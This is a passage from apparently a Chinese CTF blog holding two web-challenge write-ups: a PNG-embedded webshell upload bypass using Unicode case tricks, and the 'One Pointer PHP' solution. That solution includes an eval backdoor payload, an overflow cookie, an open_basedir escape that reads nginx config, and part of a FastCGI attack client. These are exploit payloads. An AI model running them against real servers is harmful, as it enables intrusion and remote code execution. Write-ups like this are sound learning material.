    <span class="nv">$pos_for_zip</span> <span class="o">=</span> <span class="s2">&#34;/tmp/example/&#34;</span> <span class="o">.</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REMOTE_ADDR&#34;</span><span class="p">]);</span>
    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">extractTo</span><span class="p">(</span><span class="nv">$pos_for_zip</span><span class="p">);</span>
    <span class="nv">$zip</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
    <span class="nx">unlink</span><span class="p">(</span><span class="nv">$name_for_zip</span><span class="p">);</span>
    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">glob</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">$pos_for_zip</span><span class="s2">/*&#34;</span><span class="p">);</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span>
        <span class="k">if</span> <span class="p">(</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="nv">$first</span> <span class="o">=</span> <span class="nx">imagecreatefrompng</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
        <span class="nv">$size</span> <span class="o">=</span> <span class="nx">min</span><span class="p">(</span><span class="nx">imagesx</span><span class="p">(</span><span class="nv">$first</span><span class="p">),</span> <span class="nx">imagesy</span><span class="p">(</span><span class="nv">$first</span><span class="p">));</span>
        <span class="nv">$second</span> <span class="o">=</span> <span class="nx">imagecrop</span><span class="p">(</span><span class="nv">$first</span><span class="p">,</span> <span class="p">[</span><span class="s1">&#39;x&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;y&#39;</span> <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;width&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">,</span> <span class="s1">&#39;height&#39;</span> <span class="o">=&gt;</span> <span class="nv">$size</span><span class="p">]);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$second</span> <span class="o">!==</span> <span class="k">FALSE</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$final_name</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file</span><span class="p">)[</span><span class="s2">&#34;basename&#34;</span><span class="p">];</span>
            <span class="nx">imagepng</span><span class="p">(</span><span class="nv">$second</span><span class="p">,</span> <span class="s1">&#39;example/&#39;</span><span class="o">.</span><span class="nv">$final_name</span><span class="p">);</span>
            <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$second</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nx">imagedestroy</span><span class="p">(</span><span class="nv">$first</span><span class="p">);</span>
        <span class="nx">unlink</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
    <span class="p">}</span>

<span class="p">}</span>

</code></pre></div><p>思路应该是绕过上传一个zip，然后解压得到php从而getshell。</p>
<p>比赛的时候对这个<code>imagecreatefrompng</code>始终没能绕过去，因为之前写图片马都是直接写到尾部，但是这里会被直接截断，需要用到一个工具。</p>
<p>上传对文件名有所限制,不能出现<strong>i</strong>,但是又用到了<code>mb_strtolower</code>,想到了之前p神出的codebreaking里面有关于js的<code>toUpperCase()</code> 与<code>toLowerCase()</code>特性，来php中试一试。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">echo</span> <span class="nx">mb_strtoupper</span><span class="p">(</span><span class="s2">&#34;ı&#34;</span><span class="p">);</span> <span class="c1">//I
</span><span class="c1"></span><span class="k">echo</span> <span class="nx">mb_strtoupper</span><span class="p">(</span><span class="s2">&#34;ſ&#34;</span><span class="p">);</span> <span class="c1">//S
</span><span class="c1"></span>
<span class="k">echo</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="s2">&#34;İ&#34;</span><span class="p">);</span> <span class="c1">//i
</span><span class="c1"></span><span class="k">echo</span> <span class="nx">mb_strtolower</span><span class="p">(</span><span class="s2">&#34;K&#34;</span><span class="p">);</span> <span class="c1">//k
</span><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>可以看到都是ok的。这里题目还非常贴心的用了urldecode,那我们用<code>%c4%b0</code>即可。</p>
<p>下一步也就是要绕过图片尺寸，因为我们是明确了上传的是一个压缩包，里面含有一个php文件的图片马，这里可以用宏定义来直接绕过尺寸。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nx">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;postedFile&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>这里我们随意创建一个zip文件，抓包尝试：</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519160130742.png" alt="image-20210519160130742"></p>
<p>可以看到是成功绕过,那现在重新回归一下思路</p>
<ol>
<li>
<p>创建图片马</p>
</li>
<li>
<p>绕过图片尺寸 宏定义</p>
</li>
<li>
<p>添加至压缩文件,改后缀名为<code>z%c4%b0p</code>，绕过<code>i</code></p>
</li>
<li>
<p>在example.php处解压，访问马即可。</p>
</li>
</ol>
<p>这题的关键就是如何把我们的webshell隐藏在图片里，而不会被裁剪的时候删去。</p>
<p>结束后我翻到了这一篇12年<a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">文章</a>&hellip;对应作者在github也有其<a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator">工具</a>。</p>
<p>但是原payload使用的payload为<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>,这种调用动态函数的方法在php5中是不可取的，需要修改。</p>
<p>payload使用的Huffman编码,在这个<a href="https://gchq.github.io/">网址</a>可以直接进行编码解码，修改我们的payload。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519171632231.png" alt="image-20210519171632231"></p>
<p>运行即可得到图片马,后续按如期操作即可。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519172210942.png" alt="image-20210519172210942"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-19-image-20210519173821329.png" alt="image-20210519173821329"></p>
<p>还有一道类似Laravel Debug mode RCE（CVE-2021-3129）的题目,可惜自己对框架这一块一直没怎么注重,今天开始代码审计计划，给自己也挖一个坑,一周至少两个cms,一个月后去接触框架漏洞。</p>
]]></content>
		</item>
		
		<item>
			<title>蓝帽杯 One Pointer PHP</title>
			<link>https://theoyu.top/posts/bluehat/</link>
			<pubDate>Tue, 04 May 2021 21:30:20 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/bluehat/</guid>
			<description>两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。
&amp;lt;?php class User{ public $count; } if($user=unserialize($_COOKIE[&amp;#34;data&amp;#34;])){ $count[++$user-&amp;gt;count]=1; if($count[]=1){ $user-&amp;gt;count+=1; setcookie(&amp;#34;data&amp;#34;,serialize($user)); }else{ eval($_GET[&amp;#34;backdoor&amp;#34;]); } }else{ $user=new User; $user-&amp;gt;count=1; setcookie(&amp;#34;data&amp;#34;,serialize($user)); } ?&amp;gt;题目给了源码，第一关是数组溢出，需要$count[]=1，这一步赋值操作报错即可命令执行，貌似php的溢出长度和操作系统有关，我在本地尝试的时候2^31-1即可绕过，但题目上需要2*63-1，不过关系不大，然后蚁剑连上去即可。
add_api.php?backdoor=eval($_POST[theoyu])；蚁剑设置Cookiedata=O%3a4%3a&amp;quot;User&amp;quot;%3a1%3a{s%3a5%3a&amp;quot;count&amp;quot;%3bi%3a9223372036854775806%3b}发现只能看当前目录，多半是open_basedir设置了只有当前目录，不过这个好说，p神有文章绕过这个，然后看了一眼phpinfo() &amp;hellip;
putenv 居然被过滤了！前几天还专门研究了这个，不过在phpinfo() 中发现Server API =FPM/FastCGI ，之前学SSRF 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了
好像没啥会的了，就尝试读一下配置文件，读取方式如下：
&amp;lt;?php mkdir(&amp;#39;theoyu&amp;#39;); chdir(&amp;#39;theoyu&amp;#39;); ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;..&amp;#39;); chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;);chdir(&amp;#39;..&amp;#39;); ini_set(&amp;#39;open_basedir&amp;#39;,&amp;#39;/&amp;#39;); // 此处用来读目录 // $a = new DirectoryIterator(&amp;#34;glob:///etc/nginx/sites-enabled/*&amp;#34;); // foreach($a as $f){ // echo($f-&amp;gt;__toString().&amp;#39;&amp;lt;br&amp;gt;&amp;#39;); // }  //此处用来读文件 echo file_get_contents(&amp;#39;/etc/nginx/sites-enabled/default&amp;#39;); ?&amp;gt;这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口&amp;hellip;然后就不会了&amp;hellip;
看wp发现师傅们用的是ftp 与 php-fpm 对话 RCE，具体可参考这一篇文章，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。
那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将fpmRCE的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。
fastcgi 的攻击脚本有php和go的，经过测试都可以运行，在php_value 处把disable_function置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。</description>
			<content type="html"><![CDATA[<p>两个web，一个js小游戏代码审计1小时，玩10秒弹flag什么鬼，还有一个就是这道全场1解题。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">User</span><span class="p">{</span>
	<span class="k">public</span> <span class="nv">$count</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span><span class="p">(</span><span class="nv">$user</span><span class="o">=</span><span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">])){</span>
	<span class="nv">$count</span><span class="p">[</span><span class="o">++</span><span class="nv">$user</span><span class="o">-&gt;</span><span class="na">count</span><span class="p">]</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
	<span class="k">if</span><span class="p">(</span><span class="nv">$count</span><span class="p">[]</span><span class="o">=</span><span class="mi">1</span><span class="p">){</span>
		<span class="nv">$user</span><span class="o">-&gt;</span><span class="na">count</span><span class="o">+=</span><span class="mi">1</span><span class="p">;</span>
		<span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
	<span class="p">}</span><span class="k">else</span><span class="p">{</span>
		<span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">&#34;backdoor&#34;</span><span class="p">]);</span>
	<span class="p">}</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
	<span class="nv">$user</span><span class="o">=</span><span class="k">new</span> <span class="nx">User</span><span class="p">;</span>
	<span class="nv">$user</span><span class="o">-&gt;</span><span class="na">count</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span>
	<span class="nx">setcookie</span><span class="p">(</span><span class="s2">&#34;data&#34;</span><span class="p">,</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$user</span><span class="p">));</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>题目给了源码，第一关是数组溢出，需要<code>$count[]=1</code>，这一步赋值操作报错即可命令执行，貌似php的溢出长度和操作系统有关，我在本地尝试的时候2^31-1即可绕过，但题目上需要2*63-1，不过关系不大，然后蚁剑连上去即可。</p>
<pre><code>add_api.php?backdoor=eval($_POST[theoyu])；
蚁剑设置Cookie
data=O%3a4%3a&quot;User&quot;%3a1%3a{s%3a5%3a&quot;count&quot;%3bi%3a9223372036854775806%3b}
</code></pre><p>发现只能看当前目录，多半是<code>open_basedir</code>设置了只有当前目录，不过这个好说，p神有文章绕过这个，然后看了一眼<strong>phpinfo()</strong> &hellip;</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505180925973.png" alt="image-20210505180925973"></p>
<p><strong>putenv</strong> 居然被过滤了！前几天还专门研究了这个，不过在<strong>phpinfo()</strong> 中发现<strong>Server API =FPM/FastCGI</strong> ，之前学<strong>SSRF</strong> 的时候有接触过这个，可以通过这个RCE，但好像根本没有ssrf的入口..思绪在这里就断了</p>
<p>好像没啥会的了，就尝试读一下配置文件，读取方式如下：</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="nx">mkdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
<span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;theoyu&#39;</span><span class="p">);</span>
<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>
<span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span><span class="nx">chdir</span><span class="p">(</span><span class="s1">&#39;..&#39;</span><span class="p">);</span>

<span class="nx">ini_set</span><span class="p">(</span><span class="s1">&#39;open_basedir&#39;</span><span class="p">,</span><span class="s1">&#39;/&#39;</span><span class="p">);</span>

<span class="c1">// 此处用来读目录
</span><span class="c1">// $a = new DirectoryIterator(&#34;glob:///etc/nginx/sites-enabled/*&#34;);
</span><span class="c1">// foreach($a as $f){
</span><span class="c1">//     echo($f-&gt;__toString().&#39;&lt;br&gt;&#39;);
</span><span class="c1">// }
</span><span class="c1"></span>
<span class="c1">//此处用来读文件
</span><span class="c1"></span><span class="k">echo</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s1">&#39;/etc/nginx/sites-enabled/default&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>这个读取过程也是很折磨，大概就是一点一点摸索吧，在配置文件发现了fastcgi的开放端口&hellip;然后就不会了&hellip;</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/05/2021-05-05-image-20210505162441456.png" alt="image-20210505162441456"></p>
<p>看wp发现师傅们用的是<strong>ftp 与 php-fpm 对话 RCE</strong>，具体可参考<a href="https://www.anquanke.com/post/id/233454">这一篇文章</a>，后续我应该也会专门总结一篇关于fastcgi和fpm的文章。</p>
<p>那有了ftp的对话，思路就很清晰了，通过本地vps起一个ftp服务，在靶机上将<strong>fpmRCE</strong>的payload发送给ftp，再又ftp转发给靶机的9001端口形成ssrf，不得不说实在太巧妙了。</p>
<p><strong>fastcgi</strong> 的攻击脚本有php和go的，经过测试都可以运行，在<strong>php_value</strong> 处把<strong>disable_function</strong>置空即可。有的师傅也利用了extension去加载**.so**反弹shell，不过我感觉既然蚁剑已经可以连接了，就不需要这一步。</p>
<div class="highlight"><pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>

<span class="k">class</span> <span class="nc">FCGIClient</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="no">VERSION_1</span>            <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">BEGIN_REQUEST</span>        <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">ABORT_REQUEST</span>        <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">END_REQUEST</span>          <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">PARAMS</span>               <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STDIN</span>                <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STDOUT</span>               <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">STDERR</span>               <span class="o">=</span> <span class="mi">7</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">DATA</span>                 <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">GET_VALUES</span>           <span class="o">=</span> <span class="mi">9</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">GET_VALUES_RESULT</span>    <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">UNKNOWN_TYPE</span>         <span class="o">=</span> <span class="mi">11</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">MAXTYPE</span>              <span class="o">=</span> <span class="nx">self</span><span class="o">::</span><span class="na">UNKNOWN_TYPE</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">RESPONDER</span>            <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">AUTHORIZER</span>           <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">FILTER</span>               <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">REQUEST_COMPLETE</span>     <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">CANT_MPX_CONN</span>        <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">OVERLOADED</span>           <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">UNKNOWN_ROLE</span>         <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">MAX_CONNS</span>            <span class="o">=</span> <span class="s1">&#39;MAX_CONNS&#39;</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">MAX_REQS</span>             <span class="o">=</span> <span class="s1">&#39;MAX_REQS&#39;</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">MPXS_CONNS</span>           <span class="o">=</span> <span class="s1">&#39;MPXS_CONNS&#39;</span><span class="p">;</span>
    <span class="k">const</span> <span class="no">HEADER_LEN</span>           <span class="o">=</span> <span class="mi">8</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$_sock</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$_host</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$_port</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>

    <span class="k">private</span> <span class="nv">$_keepAlive</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$port</span> <span class="o">=</span> <span class="mi">9001</span><span class="p">)</span> <span class="c1">// and default value for port, just for unixdomain socket
</span><span class="c1"></span>    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_host</span> <span class="o">=</span> <span class="nv">$host</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_port</span> <span class="o">=</span> <span class="nv">$port</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">setKeepAlive</span><span class="p">(</span><span class="nv">$b</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_keepAlive</span> <span class="o">=</span> <span class="p">(</span><span class="nx">boolean</span><span class="p">)</span><span class="nv">$b</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_keepAlive</span> <span class="o">&amp;&amp;</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">fclose</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="nf">getKeepAlive</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_keepAlive</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">connect</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">//$this-&gt;_sock = fsockopen($this-&gt;_host, $this-&gt;_port, $errno, $errstr, 5);
</span><span class="c1"></span>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span> <span class="o">=</span> <span class="nx">stream_socket_client</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_host</span><span class="p">,</span> <span class="nv">$errno</span><span class="p">,</span> <span class="nv">$errstr</span><span class="p">,</span> <span class="mi">5</span><span class="p">);</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">_sock</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s1">&#39;Unable to connect to FastCGI application&#39;</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">buildPacket</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span> <span class="nv">$content</span><span class="p">,</span> <span class="nv">$requestId</span> <span class="o">=</span> <span class="mi">1</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$clen</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">chr</span><span class="p">(</span><span class="nx">self</span><span class="o">::</span><span class="na">VERSION_1</span><span class="p">)</span>         <span class="cm">/* version */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$type</span><span class="p">)</span>                    <span class="cm">/* type */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$requestId</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="cm">/* requestIdB1 */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$requestId</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>        <span class="cm">/* requestIdB0 */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$clen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>     <span class="cm">/* contentLengthB1 */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$clen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>             <span class="cm">/* contentLengthB0 */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                        <span class="cm">/* paddingLength */</span>
            <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>                        <span class="cm">/* reserved */</span>
            <span class="o">.</span> <span class="nv">$content</span><span class="p">;</span>                     <span class="cm">/* content */</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">buildNvpair</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="nv">$value</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$nlen</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$name</span><span class="p">);</span>
        <span class="nv">$vlen</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$value</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* nameLengthB0 */</span>
            <span class="nv">$nvpair</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$nlen</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="cm">/* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */</span>
            <span class="nv">$nvpair</span> <span class="o">=</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$nlen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$vlen</span> <span class="o">&lt;</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* valueLengthB0 */</span>
            <span class="nv">$nvpair</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$vlen</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="cm">/* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */</span>
            <span class="nv">$nvpair</span> <span class="o">.=</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">|</span> <span class="mh">0x80</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">((</span><span class="nv">$vlen</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="o">.</span> <span class="nx">chr</span><span class="p">(</span><span class="nv">$vlen</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="cm">/* nameData &amp; valueData */</span>
        <span class="k">return</span> <span class="nv">$nvpair</span> <span class="o">.</span> <span class="nv">$name</span> <span class="o">.</span> <span class="nv">$value</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">private</span> <span class="k">function</span> <span class="nf">readNvpair</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="nv">$length</span> <span class="o">=</span> <span class="k">null</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$length</span> <span class="o">===</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$p</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="k">while</span> <span class="p">(</span><span class="nv">$p</span> <span class="o">!=</span> <span class="nv">$length</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$nlen</span> <span class="o">=</span> <span class="nx">ord</span><span class="p">(</span><span class="nv">$data</span><span class="p">{</span><span class="nv">$p</span><span class="o">++</span><span class="p">});</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&gt;=</span> <span class="mi">128</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$nlen</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$nlen</span> <span class="o">&amp;</span> <span class="mh">0x7F</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">);</span>
